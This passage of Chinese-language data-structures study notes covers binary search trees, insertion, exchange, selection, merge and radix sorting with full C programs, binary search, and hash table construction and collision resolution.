= S[x]; return x; } void Union(int S[], int Root1, int Root2) { S[Root1] += S[Root2]; //更新Root1的根节点值 S[Root2] = Root1; //更新Root2的根节点值 } 树的应用-二叉排序树\r#\rBST，也称二叉查找树。\n二叉排序树或者为空树，或者为非空树，当为非空树时有如下特点：\n若左子树非空，则左子树上所有结点关键字均小于根节点的关键字。\n若右子树非空，则右子树上所有结点关键字均大于根节点的关键字。\n左右子树本身也分别是一棵二叉排序树。\n⭐中序遍历二叉排序树，得到的是一个递增的有序序列。\n查找\n二叉树非空时，查找根节点，若相等则查找成功；\n若不等，则当小于根节点值时，查找左子树；当大于根节点值时，查找右子树。\n当查找到叶节点仍没查找到相应的值，则查找失败。\n非递归算法实现查找算法\nBSTNode *BST_Search(BiTree T, ElemType key, BSTNode *\u0026amp;p) { p = NULL; while (T!=NULL \u0026amp;\u0026amp; key!=T-\u0026gt;data) { p = T; if (key \u0026lt; T-\u0026gt;data) T=T-\u0026gt;lchild; else T=T-\u0026gt;rchild; } return T; } 插入操作\n若二叉排序树为空，则直接插入结点；\n若二叉排序树非空，\n​\t当值小于根节点时，插入左子树；\n​\t当值大于根节点时，插入右子树；\n​\t当值等于根节点时，不进行插入；\nint BST_Insert(BiTree \u0026amp;T, KeyType k) { if (T == NULL) { T = (BiTree)malloc(sizeof(BSTNode)); T-\u0026gt;key = k; T-\u0026gt;lchild = T-\u0026gt;rchild = NULL; return 1; } else if (k == T-\u0026gt;key) return 0; else if (k \u0026lt; T-\u0026gt;key) return BST_Insert(T-\u0026gt;lchild, k); else return BST_Insert(T-\u0026gt;rchild, k); } 构造二叉排序树\n不断调用插入函数来构造。\nvoid Create_BST(BiTree \u0026amp;T, KeyType str[], int n) { T = NULL; int i = 0; while (i \u0026lt; n) { BST_Insert(T, str[i]); i++; } } 删除操作\n若被删结点是叶子结点，则可以直接删除。\n若被删结点z只有一棵子树，则让z的子树成为z父结点的子树，代替z结点。\n若被删除结点z有两棵子树，则让z的中序序列直接后继代替z，并删去直接后继结点。\n在二叉排序树中删除并插入某个结点，得到的二叉排序树不一定相同。\n查找效率\n平均查找长度ASL取决于树的高度。\n第六章 散列\r#\r第七章 优先队列（堆）\r#\r第八章 排序\r#\r8.1 排序算法简述\r#\r理解：\n排序的目的：快速查找\n衡量排序算法的优劣\n时间复杂度：分析关键字的比较次数和记录的移动次数。 空间复杂度：分析排序算法中需要多少辅助内存。 稳定性：若两个记录 A 和 B 的关键字相等，但排序后 A 和 B 的先后次序保持不变，则称这种排序算法是稳定的。 排序的分类\n内部排序 选择排序 直接选择排序、堆排序 交换排序 冒泡排序、快速排序 插入排序 直接插入排序、折半插入排序、Shell 排序 归并排序 桶式排序 基数排序 外部排序（需要借助于磁盘） 多路归并排序 8.2 插入排序\r#\r8.2.1 直接插入排序\r#\r8.2.1.1 算法思想\r#\r做法是：每次从无序表中取出第一个元素，把它插入到有序表的合适位置，使有序表仍然有序。\n（1）第一趟比较前两个数，然后把第二个数按大小插入到有序表中； （2）第二趟把第三个数据与前两个数从前向后扫描，把第三个数按大小插入到有序表中； （3）依次进行下去，进行了(n-1)趟扫描以后就完成了整个排序过程。 如下图所示。\n8.2.1.2 算法步骤\r#\r算法步骤：\n（1）判断是否需要进行调整，如果 array[i] \u0026lt; array[i-1] 就需要进行；如果不需要调整，直接判断下一个数是否要调整。 （2）使用 array[0] 暂存需要调整的数 （3）在 array[1..i-1] 中查找 aray[i] 的插入位置，array[1..j] \u0026lt; array[i] \u0026lt; R[j+1..i-1]；将 array[j+1..i-1]中的所有记录均后移一个位置； （4）将 array[0] 插入到 array[j+1] 的位置上。 8.2.1.3 算法实现\r#\rvoid InsertSort(int *array) { int i, j; for (i = 2; i \u0026lt;= n; i++) { // 判断是否需要调整 if (array[i] \u0026lt; array[i - 1]) { // 使用 array[0] 保存 array[i] array[0] = array[i]; // 记录后移 array[i] = array[i - 1]; for (j = i - 2; array[0] \u0026lt; array[j]; j--) { array[j + 1] = array[j]; } // 插入到有序子数组中 array[j + 1] = array[0]; } } } 8.2.1.4 完整代码\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int n; /* * 直接插入排序 */ void InsertSort(int *array) { int i, j; for (i = 2; i \u0026lt;= n; i++) { if (array[i] \u0026lt; array[i - 1]) { array[0] = array[i]; array[i] = array[i - 1]; for (j = i - 2; array[0] \u0026lt; array[j]; j--) { array[j + 1] = array[j]; } array[j + 1] = array[0]; } } } int main() { int i; int *array; printf(\u0026#34;请输入数组的大小：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); array = (int*) malloc(sizeof(int) * (n + 1)); printf(\u0026#34;请输入数据（用空格分隔）：\u0026#34;); for (i = 1; i \u0026lt;= n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;array[i]); } InsertSort(array); printf(\u0026#34;排序后为：\u0026#34;); for (i = 1; i \u0026lt;= n; i++) { printf(\u0026#34;%d \u0026#34;, array[i]); } printf(\u0026#34;\\n\u0026#34;); } 8.2.2 希尔排序\r#\r8.2.2.1 算法思想\r#\r希尔排序也是插入排序的一种，但它在效率上要比上面的直接插入排序高，它是对直接插入排序的改进，它的基本思想是：\n（1）先取一个小于 n 的整数 d1 作为第一个增量，把文件的全部记录分组。 （2）所有距离为 d1 的倍数的记录放在同一个组中。先在各组内进行直接插入排序； （3）然后，取第二个增量 d2\u0026lt; d1 重复上述的分组和排序，直至所取的增量 dt=1(dt\u0026lt;\u0026hellip;\u0026lt; d2\u0026lt; d1)，即所有记录放在同一组中进行直接插入排序为止。 增量序列尤为关键（如何选择最佳增量序列，目前尚未解决），一般的初次取序列的一半为增量，以后每次减半，直到增量为 1。\n8.2.2.2 算法步骤\r#\r算法步骤：\n（1）选择一个增量序列：初始 k = n / 2、之后 k = k / 2，仅作举例； （2）当 k \u0026gt; 0 时进行排序，会进行多趟排序； （3）每趟排序，根据对应的增量 k，将待排序列分割成若干子序列，分别对各子表进行直接插入排序。仅增量因子为 1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。 8.2.2.3 算法实现\r#\rvoid ShellSort(int *array) { int k = n / 2; //增量序列（仅作举例） while (k \u0026gt; 0) { int i, j; // 划分子序列 for (i = k + 1; i \u0026lt;= n; i++) { // 插入排序 if (array[i] \u0026lt; array[i - k]) { array[0] = array[i]; for (j = i - k; j \u0026gt; 0 \u0026amp;\u0026amp; array[0] \u0026lt; array[j]; j -= k) { array[j + k] = array[j]; } array[j + k] = array[0]; } } // 重新赋值 k k = k / 2; } } 8.2.2.4 完整代码\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int n; /* * 希尔排序 */ void ShellSort(int *array) { int k = n / 2; //增量序列（仅作举例） while (k \u0026gt; 0) { int i, j; for (i = k + 1; i \u0026lt;=n; i++) { if (array[i] \u0026lt; array[i - k]) { array[0] = array[i]; for (j = i - k; j \u0026gt; 0 \u0026amp;\u0026amp; array[0] \u0026lt; array[j]; j -= k) { array[j + k] = array[j]; } array[j + k] = array[0]; } } k = k / 2; } } int main() { int i; int *array; printf(\u0026#34;请输入数组的大小：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); array = (int*) malloc(sizeof(int) * (n + 1)); printf(\u0026#34;请输入数据（用空格分隔）：\u0026#34;); for (i = 1; i \u0026lt;= n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;array[i]); } ShellSort(array); printf(\u0026#34;排序后为：\u0026#34;); for (i = 1; i \u0026lt;= n; i++) { printf(\u0026#34;%d \u0026#34;, array[i]); } printf(\u0026#34;\\n\u0026#34;); } 8.3 交换排序\r#\r8.3.1 冒泡排序\r#\r8.3.1.1 算法思想\r#\r冒泡排序是一种交换排序，它的主要过程是：\n比较相邻的元素。如果第一个比第二个大，就交换他们两个。 对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。比较一趟之后，最后的元素应该会是最大的数。 针对所有的元素重复以上的步骤，除了最后一个。 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。 8.3.1.2 算法步骤\r#\r算法步骤：\n（1）外层循环定义进行 n-1 趟排序 （2）内层循环进行两两比较 （3）如果左边元素 array[j] 大于右侧元素 array[j + 1]，则进行交换 8.3.1.3 算法实现\r#\rvoid BubbleSort(int *array) { int i, j, temp; for (i = 0; i \u0026lt; n - 1; i++) { for (j = 0; j \u0026lt; n - 1 - i; j++) { // 交换 if (array[j] \u0026gt; array[j + 1]) { temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; } } } } 8.3.1.4 完整代码\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int n; /* * 冒泡排序 */ void BubbleSort(int *array) { int i, j, temp; for (i = 0; i \u0026lt; n - 1; i++) { for (j = 0; j \u0026lt; n - 1 - i; j++) { if (array[j] \u0026gt; array[j + 1]) { temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; } } } } int main() { int i; int *array; printf(\u0026#34;请输入数组的大小：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); array = (int*) malloc(sizeof(int) * n); printf(\u0026#34;请输入数据（用空格分隔）：\u0026#34;); for (i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;array[i]); } BubbleSort(array); printf(\u0026#34;排序后为：\u0026#34;); for (i = 0; i \u0026lt; n; i++) { printf(\u0026#34;%d \u0026#34;, array[i]); } printf(\u0026#34;\\n\u0026#34;); } 8.3.2 快速排序\r#\r8.3.2.1 算法思想\r#\r快速排序是对冒泡排序的改进，它的基本思想是通过一趟排序将数据分成两部分，一部分中的数据都比另一部分中的数据小，再对这两部分中的数据再排序，直到整个序列有序。\n8.3.2.2 算法步骤\r#\r其实现非常简单：\n（1）使用 Partition 函数从原始数组中选取一个元素为中心。 （1）所有比它小的元素一律前放，比它大的元素一律后放，形成左右两个子表，这里递归调用本身分别将两个子表进行排序（对各子表重新选择中心元素并依此规则调整，直到每个子表的元素只剩一个，此时 high \u0026gt;= low，递归结束） 8.3.2.3 算法实现\r#\r实现的关键是分割原始数组： int Partition(int *array, int low, int high) { int pivotkey = array[low]; array[0] = array[low]; while (low \u0026lt; high) { while (low \u0026lt; high \u0026amp;\u0026amp; array[high] \u0026gt;= pivotkey) { high--; } array[low] = array[high]; while (low \u0026lt; high \u0026amp;\u0026amp; array[low] \u0026lt;= pivotkey) { low++; } array[high] = array[low]; } array[low] = array[0]; return low; } 快速排序 void QuickSort(int *array, int low, int high) { if (low \u0026lt; high) { int pivotloc = Partition(array, low, high); QuickSort(array, low, pivotloc - 1); QuickSort(array, pivotloc + 1, high); } } 8.3.2.4 完整代码\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int n; /* * 分割使枢轴记录的左边元素比右边元素小 */ int Partition(int *array, int low, int high) { int pivotkey = array[low]; array[0] = array[low]; while (low \u0026lt; high) { while (low \u0026lt; high \u0026amp;\u0026amp; array[high] \u0026gt;= pivotkey) { high--; } array[low] = array[high]; while (low \u0026lt; high \u0026amp;\u0026amp; array[low] \u0026lt;= pivotkey) { low++; } array[high] = array[low]; } array[low] = array[0]; return low; } /* * 快速排序递归实现 */ void QuickSort(int *array, int low, int high) { if (low \u0026lt; high) { int pivotloc = Partition(array, low, high); QuickSort(array, low, pivotloc - 1); QuickSort(array, pivotloc + 1, high); } } int main() { int i; int *array; printf(\u0026#34;请输入数组的大小：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); array = (int*) malloc(sizeof(int) * (n + 1)); printf(\u0026#34;请输入数据（用空格分隔）：\u0026#34;); for (i = 1; i \u0026lt;= n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;array[i]); } QuickSort(array, 1, n); printf(\u0026#34;排序后为：\u0026#34;); for (i = 1; i \u0026lt;= n; i++) { printf(\u0026#34;%d \u0026#34;, array[i]); } printf(\u0026#34;\\n\u0026#34;); } 8.4 选择排序\r#\r8.4.1 简单选择排序\r#\r8.4.1.1 算法思想\r#\r简单选择排序的基本思想是：\n通过 n-1 次数据元素的比较，从 n-i+1 个记录中选择最小的数据，并与第 i 个数据进行交换，如下图所示。\n8.4.1.2 算法步骤\r#\r算法步骤：\n（1）循环 n 次，进行 n 趟排序 （2）在第 i 趟排序中，从第 i 个元素开始向后查找最小的元素 （3）将这个最小的元素不是第 i 个，而是在 i 之后的元素，则将这两个元素的位置对换。 8.4.1.3 算法实现\r#\rvoid SelectSort(int *array) { int i, j, k, temp; // n 趟排序 for (i = 0; i \u0026lt; n; i++) { k = i; // 寻找最小的元素下标 for (j = i + 1; j \u0026lt; n; j++) { if (array[j] \u0026lt; array[k]) { k = j; } } // 如果这个不是第 i 个，则交换第 i 个和第 k 个 if (k != i) { temp = array[i]; array[i] = array[k]; array[k] = temp; } } } 8.4.1.4 完整代码\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int n; /* * 选择排序 */ void SelectSort(int *array) { int i, j, k, temp; for (i = 0; i \u0026lt; n; i++) { k = i; for (j = i + 1; j \u0026lt; n; j++) { if (array[j] \u0026lt; array[k]) { k = j; } } if (k != i) { temp = array[i]; array[i] = array[k]; array[k] = temp; } } } int main() { int i; int *array; printf(\u0026#34;请输入数组的大小：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); array = (int*) malloc(sizeof(int) * n); printf(\u0026#34;请输入数据（用空格分隔）：\u0026#34;); for (i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;array[i]); } SelectSort(array); printf(\u0026#34;排序后为：\u0026#34;); for (i = 0; i \u0026lt; n; i++) { printf(\u0026#34;%d \u0026#34;, array[i]); } printf(\u0026#34;\\n\u0026#34;); } 8.4.2 堆排序\r#\r8.4.2.1 算法思想\r#\r通过前面二叉树的学习，我们知道堆是完全二叉树，有最大堆和最小堆，其中最大堆是父结点的值比子结点大，相应的最小堆就是父结点的值比子节点小。\n堆排序就是利用了最大堆（或最小堆）堆顶记录的关键字最大（或最小）这一特征，使得在当前无序区中选取最大（或最小）关键字变得简单。以最大堆为例，它的基本思想就是：\n先将初始文件 R[1..n] 建成一个最大堆，此堆为初始的无序区； 再将关键字最大的记录 R[1]（即堆顶）和无序区的最后一个记录 R[n] 交换，由此得到新的无序区 R[1..n-1] 和有序区 R[n]，且满足 R[1..n-1].keys≤R[n].key； 由于交换后新的根 R[1] 可能违反堆性质，故应将当前无序区 R[1..n-1] 调整为堆。然后再次将 R[1..n-1] 中关键字最大的记录 R[1] 和该区间的最后一个记录 R[n-1] 交换，由此得到新的无序区 R[1..n-2] 和有序区 R[n-1..n]，且仍满足关系 R[1..n-2].keys≤R[n1..n].keys，同样要将 R[1..n-2] 调整为堆； 重复此操作直到全部有序。 下面是示例图：\n8.4.2.2 算法实现\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int n; /* * 生成堆 */ void HeapAdjust(int *array, int s, int m) { int i; array[0] = array[s]; for (i = s * 2; i \u0026lt;= m; i *= 2) { if (i \u0026lt; m \u0026amp;\u0026amp; array[i] \u0026lt; array[i + 1]) { i++; } if (!(array[0] \u0026lt; array[i])) { break; } array[s] = array[i]; s = i; } array[s] = array[0]; } /* * 堆排序 */ void HeapSort(int *array) { int i; for (i = n / 2; i \u0026gt; 0; i--) { HeapAdjust(array, i, n); } for (i = n; i \u0026gt; 1; i--) { array[0] = array[1]; array[1] = array[i]; array[i] = array[0]; HeapAdjust(array, 1, i - 1); } } int main() { int i; int *array; printf(\u0026#34;请输入数组的大小：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); array = (int*) malloc(sizeof(int) * (n + 1)); printf(\u0026#34;请输入数据（用空格分隔）：\u0026#34;); for (i = 1; i \u0026lt;= n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;array[i]); } HeapSort(array); printf(\u0026#34;排序后为：\u0026#34;); for (i = 1; i \u0026lt;= n; i++) { printf(\u0026#34;%d \u0026#34;, array[i]); } printf(\u0026#34;\\n\u0026#34;); } 8.5 归并排序\r#\r8.5.1 算法思想\r#\r归并排序是建立在归并操作上的一种有效的排序算法，它过程为：\n比较 a[i] 和 a[j] 的大小，若 a[i]≤a[j]，则将第一个有序表中的元素 a[i] 复制到 r[k] 中，并令 i 和 k 分别加上 1；\n否则将第二个有序表中的元素 a[j] 复制到 r[k] 中，并令 j 和 k 分别加上 1；\n如此循环下去，直到其中一个有序表取完，然后再将另一个有序表中剩余的元素复制到 r 中从下标 k 到下标 t 的单元。\n如下图所示。\n8.5.2 算法实现\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int n; /* * 合并 */ void Merge(int *source, int *target, int i, int m, int n) { int j, k; for (j = m + 1, k = i; i \u0026lt;= m \u0026amp;\u0026amp; j \u0026lt;= n; k++) { if (source[i] \u0026lt;= source[j]) { target[k] = source[i++]; } else { target[k] = source[j++]; } } while (i \u0026lt;= m) { target[k++] = source[i++]; } while (j \u0026lt;= n) { target[k++] = source[j++]; } } /* * 归并排序 */ void MergeSort(int *source, int *target, int s, int t) { int m, *temp; if (s == t) { target[s] = source[s]; } else { temp = (int*) malloc(sizeof(int) * (t - s + 1)); m = (s + t) / 2; MergeSort(source, temp, s, m); MergeSort(source, temp, m + 1, t); Merge(temp, target, s, m, t); } } int main() { int i; int *array; printf(\u0026#34;请输入数组的大小：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); array = (int*) malloc(sizeof(int) * n); printf(\u0026#34;请输入数据（用空格分隔）：\u0026#34;); for (i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;array[i]); } MergeSort(array, array, 0, n - 1); printf(\u0026#34;排序后为：\u0026#34;); for (i = 0; i \u0026lt; n; i++) { printf(\u0026#34;%d \u0026#34;, array[i]); } printf(\u0026#34;\\n\u0026#34;); } 8.6 基数排序\r#\r8.6.1 算法思想\r#\r基数排序是跟前面的几种排序算法完全不一样的排序算法，前面的排序算法主要通过关键字之间的比较和移动来实现，而基数排序不需要进行关键字之间的比较，它是借助多关键字的思想来实现的对于数字，每一位上的数字就是一个关键字，每一位的数字范围就是关键字范围，它的主要过程为：\n将所有待比较数值（正整数）统一为同样的数位长度，数位较短的数前面补零；\n然后，从最低位开始，依次进行一次排序；\n这样从最低位排序一直到最高位排序完成以后,数列就变成一个有序序列。\n如下图所示。类似从低位到高位比较，就是从次关键字到主关键字比较，这种称为最低位优先（LSD），反之称为最高位优先（MSD）。\n8.6.2 算法实现\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int n; //元素个数 int bit_num; //最大数字位数 /* * 获取相应位置上的数（从右到左） */ int GetNumInPos(int num, int pos) { int i, temp = 1; for (i = 0; i \u0026lt; pos - 1; i++) { temp *= 10; } return (num / temp) % 10; } /* * 基数排序（LSD） */ void RadixSort(int *array) { int radix = 10; int *count, *bucket, i, j, k; count = (int*) malloc(sizeof(int) * radix); bucket = (int*) malloc(sizeof(int) * n); for (k = 1; k \u0026lt;= bit_num; k++) { for (i = 0; i \u0026lt; radix; i++) { count[i] = 0; } //统计各个桶中所盛数据个数 for (i = 0; i \u0026lt; n; i++) { count[GetNumInPos(array[i], k)]++; } //count[i]表示第i个桶的右边界索引 for (i = 1; i \u0026lt; radix; i++) { count[i] = count[i] + count[i - 1]; } //分配 for (i = n - 1; i \u0026gt;= 0; i--) { j = GetNumInPos(array[i], k); bucket[count[j] - 1] = array[i]; count[j]--; } //收集 for (i = 0, j = 0; i \u0026lt; n; i++, j++) { array[i] = bucket[j]; } } } int main() { int i; int *array; printf(\u0026#34;请输入最大数字的位数：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;bit_num); printf(\u0026#34;请输入数组的大小：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); array = (int*) malloc(sizeof(int) * n); printf(\u0026#34;请输入数据（用空格分隔）：\u0026#34;); for (i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;array[i]); } RadixSort(array); printf(\u0026#34;排序后为：\u0026#34;); for (i = 0; i \u0026lt; n; i++) { printf(\u0026#34;%d \u0026#34;, array[i]); } printf(\u0026#34;\\n\u0026#34;); } 第九章 查找\r#\r查找包括：\n顺序查找 散列查找 二分查找 顺序查找想必大家都知道，就是从头到尾比较数据集中的每一个数据，以此来获得想要的数据，但当数据集中拥有的数据较多时，这种方法的效率就会很低。\n二分查找是比顺序查找效率高的一种查找算法，但它只适用于有序的数据集。\n9.1 二分查找\r#\r9.1.1 算法步骤\r#\r二分查找也叫折半查找，它的查找步骤为：\n（1）首先，假设表中元素是按升序排列，将表中间位置记录的关键字与查找关键字比较，如果两者相等，则查找成功； （2）否则利用中间位置记录将表分成前、后两个子表，如果中间位置记录的关键字大于查找关键字，则进一步查找前一子表，否则进一步查找后一子表。 （3）重复以上过程，直到找到满足条件的记录，使查找成功，或直到子表不存在为止，此时查找不成功，如下图所示。 9.1.2 算法实现\r#\r二分查找函数需要的参数：\nint *array：目标数组，在这个数组中进行查找 int key：待查找的关键字 int low、int high：查找的区间；若在整个数组中查找，调用时指定 low 为 0，high 为数组的长度。 执行的流程：\n若 key == array[mid]，查找成功 若 key \u0026lt; array[mid]，则 high = mid-1，进行前一子表查找 若 key \u0026gt; array[mid]，则 low = mid+1，进行后一字表查找 二分查找函数的实现：\n// 若找到，则函数值为该元素在表中的位置，否则为 0 int BinarySearch(int *array, int key, int low, int high) { int mid; while (low \u0026lt;= high) { mid = (low + high) / 2; if (key == array[mid]) { return mid; } else if (key \u0026lt; array[mid]) { // 前一子表查找 high = mid - 1; } else { // 后一字表查找 low = mid + 1; } } // 表中不存在待查元素 return 0; } 9.1.3 完整代码\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int BinarySearch(int *array, int key, int low, int high) { int mid; while (low \u0026lt;= high) { mid = (low + high) / 2; if (key == array[mid]) { return mid; } else if (key \u0026lt; array[mid]) { high = mid - 1; } else { low = mid + 1; } } return 0; } int main() { int n, i, key, position; int *array; printf(\u0026#34;请输入有序数组的大小：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); array = (int*) malloc(sizeof(int) * n); printf(\u0026#34;请按升序输入数据：\\n\u0026#34;); for (i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;array[i]); } printf(\u0026#34;请输入想要查找的数：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;key); if (position = BinarySearch(array, key, 0, n - 1)) { printf(\u0026#34;%d的位置为：%d\\n\u0026#34;, key, position); } else { printf(\u0026#34;%d不存在\\n\u0026#34;, key); } } 9.2 散列查找\r#\r9.2.1 散列函数的构造\r#\r要构造哈希表首先需要有散列函数，并且这个散列函数需要尽可能地减少冲突，通常有下面几种构造方法：\n9.2.1.1 直接定址法\r#\r我们通过一个例子来讲解，如果我们现在要对 0-20 岁的进行人口统计，那么我们对年龄这个关键字就可以直接用年龄的数字作为地址。此时 f(key) = key。\n这个时候，我们可以得出这么个哈希函数：f(0) = 0，f(1) = 1，……，f(20) = 20。这个是根据我们自己设定的直接定址来的。人数我们可以不管，我们关心的是如何通过关键字找到地址。\n如果我们现在要统计的是 80 后出生年份的人口数，那么我们对出生年份这个关键字可以用年份减去 1980 来作为地址。此时 f (key) = key-1980。\n假如今年是 2000 年，那么 1980 年出生的人就是 20 岁了，此时 f(2000) = 2000 - 1980，可以找得到地址 20，地址 20 里保存了数据“人数 500 万”。\n也就是说，我们可以取关键字的某个线性函数值为散列地址，即：\nf(key) = a × key + b 这样的散列函数优点就是简单、均匀，也不会产生冲突，但问题是这需要事先知道关键字的分布情况，适合査找表较小且连续的情况。由于这样的限制，在现实应用中，直接定址法虽然简单，但却并不常用。\n9.2.1.2 数字分析法\r#\r数字分析法是在知道关键字的情况下，取关键字的尽量不重复的几位值组成散列地址。\n9.2.1.3 平方取中法\r#\r平方取中法就是取关键字平方后的中间几位为散列地址。\n9.2.1.4 折叠法\r#\r折叠法是将关键字分为位数相等的几部分，最后一部分的位数可以不等，然后把这几部分的值（舍去进位）相加作为散列地址。\n9.2.1.5 除留余数法\r#\r除留余数法此方法为最常用的构造散列函数方法。对于散列表长为 m 的散列函数公式为：\nf( key ) = key mod p ( p ≤ m ) mod 是取模（求余数）的意思。事实上，这方法不仅可以对关键字直接取模，也可在折叠、平方取中后再取模。\n很显然，本方法的关键就在于选择合适的 p，p 如果选得不好，就可能会容易产生同义词。下面我们来举个例子看看：\n有一个关键字，它有 12 个记录，现在我们要针对它设计一个散列表。如果采用除留余数法，那么可以先尝试将散列函数设计为 f(key) = key mod 12 的方法。比如 29 mod 12 = 5，所以它存储在下标为 5 的位置。\n不过这也是存在冲突的可能的，因为 12=2×6=3×4。如果关键字中有像 18(3×6)、30(5×6)、42(7×6)等数字，它们的余数都为 6，这就和 78 所对应的下标位置冲突了。\n使用除留余数法的一个经验是，若散列表表长为 m，通常 p 为小于或等于表长（最好接近 m)的最小质数或不包含小于 20 质因子的合数。实践证明，当 P 取小于散列表长的最大质数时，产生的散列函数较好。\n9.2.1.6 随机数法\r#\r随机数法是选择一个随机函数，取关键字的随机函数值作为散列地址。\n9.2.2 处理冲突\r#\r前面在散列函数的构造中我们发现散列地址可能会产生冲突，所以处理冲突也是构造散列表中重要的一部分，通常处理冲突的方法有下面几种：\n9.2.2.1 开放定址法\r#\r所谓的开放定址法就是一旦发生了冲突，就去寻找下一个空的散列地址，只要散列表足够大，空的散列地址总能找到，并将记录存入，公式为：\nfi(key) = (f(key)+di) MOD m (di=1,2,3,...,m-1) 用开放定址法解决冲突的做法是：\n当冲突发生时，使用某种探测技术在散列表中形成一个探测序列。沿此序列逐个单元地查找，直到找到给定的关键字，或者碰到一个开放的地址（即该地址单元为空）为止（若要插入，在探查到开放的地址，则可将待插入的新结点存入该地址单元）。查找时探测到开放的地址则表明表中无待查的关键字，即查找失败。\n比如说，我们的关键字集合为{12,67,56,16,25,37,22,29,15,47,48,34}，表长为 12。 我们用散列函数 f(key) = key mod l2。\n当计算前 S 个数{12,67,56,16,25}时，都是没有冲突的散列地址，直接存入：\n计算 key = 37 时，发现 f(37) = 1，此时就与 25 所在的位置冲突。\n于是我们应用上面的公式 f(37) = (f(37)+1) mod 12 = 2。于是将 37 存入下标为 2 的位置。这其实就是房子被人买了于是买下一间的作法：\n接下来 22,29,15,47 都没有冲突，正常的存入：\n到了 key=48，我们计算得到 f(48) = 0，与 12 所在的 0 位置冲突了，不要紧，我们 f(48) = (f(48)+1) mod 12 = 1，此时又与 25 所在的位置冲突。于是 f(48) = (f(48)+2) mod 12=2，还是冲突……一直到 f(48) = (f(48)+6) mod 12 = 6 时，才有空位，机不可失，赶快存入：\n我们把这种解决冲突的开放定址法称为线性探测法。\n9.2.2.2 二次探测法\r#\r考虑深一步，如果发生这样的情况，当最后一个 key=34，f(key)=10，与 22 所在的位置冲突，可是 22 后面没有空位置了，反而它的前面有一个空位置，尽管可以不断地求余数后得到结果，但效率很差。\n因此我们可以改进 di = 12, -12, 22, -22,……, q2, -q2 (q \u0026lt;= m/2)，这样就等于是可以双向寻找到可能的空位置。\n对于 34 来说，我们取 di 即可找到空位置了。另外增加平方运算的目的是为了不让关键字都聚集在某一块区域。我们称这种方法为二次探测法。\nfi(key) = (f(key)+di) MOD m (di = 12, -12, 22, -22,……, q2, -q2, q \u0026lt;= m/2) 9.2.2.3 随机探测法\r#\r还有一种方法，是在冲突时，对于位移量 di 采用随机函数计算得到，我们称之为随机探测法。此时一定会有人问，既然是随机，那么查找的时候不也随机生成吗？如何可以获得相同的地址呢？这是个问题。这里的随机其实是伪随机数。\n伪随机数是说，如果我们设置随机种子相同，则不断调用随机函数可以生成不会重复的数列，我们在査找时，用同样的随机种子，它每次得到的数列是相同的，相同的 di 当然可以得到相同的散列地址。\nfi(key) = (f(key)+di) MOD m (di 是一个随机数列) 总之，开放定址法只要在散列表未填满时，总是能找到不发生冲突的地址，是我们常用的解决冲突的办法。\n9.2.2.4 再哈希法\r#\r再哈希法是：当散列地址冲突时，用另外一个散列函数再计算一次，这种方法减少了冲突，但增加了计算的时间。\n9.2.2.5 链地址法\r#\r前面我们谈到了散列冲突处理的开放定址法，它的思路就是一旦发生了冲突，就去寻找下一个空的散列地址。那么，有冲突就非要换地方吗？我们直接就在原地处理行不行呢？可以的，于是我们就有了链地址法：\n将所有关键字散列地址相同的记录存储在一个单链表中，我们称这种表为同义词子表，在散列表中只存储所有同义词子表的头指针。\n对于关键字集合{12,67,56,16,25,37, 22,29,15,47,48,34}，我们用 12 为除数，进行除留余数法：\n此时，已经不存在什么冲突换址的问题，无论有多少个冲突，都只是在当前位置给单链表增加结点的问题。链地址法解决冲突的做法是：将所有关键字散列地址相同的结点链接在同一个单链表中。若选定的散列表长度为 m，则可将散列表定义为一个由 m 个头指针组成的指针数组 T[0..m-1]。凡是散列地址为 i 的结点，均插入到以 T[i] 为头指针的单链表中。T 中各分量的初值均应为空指针。在拉链法中，装填因子 α 可以大于 1，但一般均取α≤1。\n链地址法的优势是对于可能会造成很多冲突的散列函数来说，提供了绝不会出现找不到地址的保障。当然，这也就带来了査找时需要遍历单链表的性能损耗，不过性能损耗在很多场合下也不是什么大问题。\n9.2.2.6 建立公共溢出区\r#\r这种方法的基本思想是：将散列表分为基本表和溢出表两部分，凡是和基本表发生冲突的元素，一律填入溢出表。\n第十章 